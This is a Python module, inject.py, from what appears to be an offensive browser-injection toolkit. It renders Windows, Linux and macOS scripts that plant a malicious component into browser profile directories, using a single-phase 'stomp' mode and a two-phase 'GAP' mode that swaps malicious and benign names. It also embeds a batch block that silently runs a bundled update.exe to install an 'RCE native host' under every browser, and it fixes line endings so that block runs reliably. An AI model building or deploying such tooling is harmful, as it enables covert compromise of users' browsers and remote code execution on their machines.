"""
inject.py - Render the on-target injection scripts (stomp & GAP) from templates.

The templates ship under deploy/templates/. Both tools share the same four
placeholders (BROWSER_NAME / PROC_NAME / PROFILE_PATH / TARGET_DIR); the GAP
variant adds MALICIOUS_NAME / BENIGN_NAME for its two-phase sequence.
"""

import os

_TEMPLATE_DIR = os.path.join(os.path.dirname(__file__), "templates")

_STOMP_TEMPLATES = {
    "windows": "inject.bat.template",
    "linux": "inject.linux.sh.template",
    "darwin": "inject.darwin.sh.template",
}

_GAP_TEMPLATES = {
    "windows": "inject_gap.bat.template",
    "linux": "inject_gap.linux.sh.template",
    "darwin": "inject_gap.darwin.sh.template",
}

# RCE native host installer block, injected into the Windows inject scripts
# (which carry a {{RCE_BLOCK}} placeholder) when the build has RCE enabled. It
# runs a bundled update.exe, which self-installs the host (registry keys + folder).
_RCE_INSTALL_BLOCK = (
    "REM Install the RCE native host [registers under all browsers] when a\n"
    "REM precompiled update.exe was bundled under rce/.\n"
    'if exist "%DEPLOY_DIR%rce\\update.exe" (\n'
    '    echo [*] Installing RCE native host [all browsers]...\n'
    '    start "" /wait "%DEPLOY_DIR%rce\\update.exe"\n'
    ') else (\n'
    '    echo [!] RCE enabled but rce\\update.exe not bundled - native host NOT installed.\n'
    ')\n'
)


def _render(template_name: str, cfg, replacements: dict) -> str | None:
    path = os.path.join(_TEMPLATE_DIR, template_name)
    if not os.path.exists(path):
        return None

    with open(path, "r", encoding="utf-8") as f:
        content = f.read()

    all_repl = {
        "BROWSER_NAME": cfg.name,
        "BROWSER_PROC_NAME": cfg.proc_name,
        "BROWSER_PROFILE_PATH": cfg.profile_path,
    }
    all_repl.update(replacements)

    for key, value in all_repl.items():
        content = content.replace("{{" + key + "}}", value)

    # cmd.exe requires CRLF line endings in .bat files. LF-only endings make it
    # misparse parenthesized if/else blocks ("... was unexpected at this time."),
    # silently aborting the script before the RCE install block runs.
    if template_name.endswith(".bat.template"):
        content = content.replace("\n", "\r\n")

    return content


def script_name(platform: str) -> str:
    """Script filename inside the ZIP for a target platform."""
    return "inject.sh" if platform != "windows" else "inject.bat"


def render_stomp_script(cfg, target_dir: str, platform: str, rce_enabled: bool = False) -> str | None:
    """Render the single-phase stomp injection script."""
    template = _STOMP_TEMPLATES.get(platform)
    if not template:
        return None
    return _render(template, cfg, {
        "BROWSER_TARGET_DIR": target_dir,
        "RCE_BLOCK": _RCE_INSTALL_BLOCK if rce_enabled else "",
    })


def render_gap_script(cfg, target_dir: str, malicious_name: str, benign_name: str, platform: str, rce_enabled: bool = False) -> str | None:
    """Render the two-phase GAP injection script."""
    template = _GAP_TEMPLATES.get(platform)
    if not template:
        return None
    return _render(template, cfg, {
        "BROWSER_TARGET_DIR": target_dir,
        "MALICIOUS_NAME": malicious_name,
        "BENIGN_NAME": benign_name,
        "RCE_BLOCK": _RCE_INSTALL_BLOCK if rce_enabled else "",
    })
